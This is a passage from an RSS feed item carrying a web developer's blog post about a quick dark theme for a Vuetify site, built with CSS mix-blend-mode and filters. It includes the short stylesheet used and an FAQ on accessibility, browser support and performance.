Our solution was to embrace the “glow” feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:</p><p>As you might have noticed in the previous screenshot, we also made some other adjustments.
We made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),
since contrast is lower in the dark theme.</p><h2>More comparison screenshots</h2><p>The following gallery shows some screenshots with custom components and JavaScript plugins.
No additional CSS was written for any of the views <small>(click to enlarge)</small>:</p><h2>Conclusion</h2><p>All in all, it took around two hours to create this dark theme. Most of the time was
spent experimenting with different settings to get acceptable contrast ratios.
There are probably better ways of doing this, but this was incredibly quick,
and allowed us to deliver something we normally wouldn&#x27;t be able to deliver.
Other than the shadows, nothing is particularly ugly, so we consider this a success.
The whole style sheet is just a couple of selectors :</p><pre><code class="language-css">html.dark-mode {
    mix-blend-mode: difference;
    filter: brightness(0.67) hue-rotate(180deg);
    font-weight: 700 !important;
}

/* Glow for dropdown/card-hover*/
.dark-mode .v-menu__content,
.dark-mode .v-card--hover:hover {
    box-shadow: 0 5px 20px rgba(142, 255, 252, 0.74);
}

.dark-mode .logo {
    filter: brightness(0);
}
</code></pre><p>Thanks for reading!</p><h2>FAQ</h2><p><em>“Many CSS frameworks have a dark-mode, why not use that?”</em>\<!-- -->
Vuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have
to write custom CSS for our own components, and for other libraries we’re using (primarily for charts).
The great thing about the blend-mode hack is that is operates independently of any framework.
You set it on an HTML tag and it treats everything the same way.</p><p><em>“What about accessibility?”</em>\<!-- -->
Yeah, this isn&#x27;t great for accessibility. Since we&#x27;re lowering the brightness to 67% we&#x27;re losing a lot of contrast.
We increased the font-weight to mitigate the effects of this, but you shouldn&#x27;t use this technique for your primary theme.</p><p><em>“What about browser support?”</em>\<!-- -->
Supported in modern browsers, except Edge.
There&#x27;s a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode#Browser_Compatibility">detailed table</a> available on MDN.</p><p><em>“What about performance?”</em>\<!-- -->
We haven&#x27;t had any problems with performance, but some readers noted that they tried
the trick on a complex website (Jira), which resulted in sluggish behavior.</p>]]></content:encoded>
        </item>
    </channel>
</rss>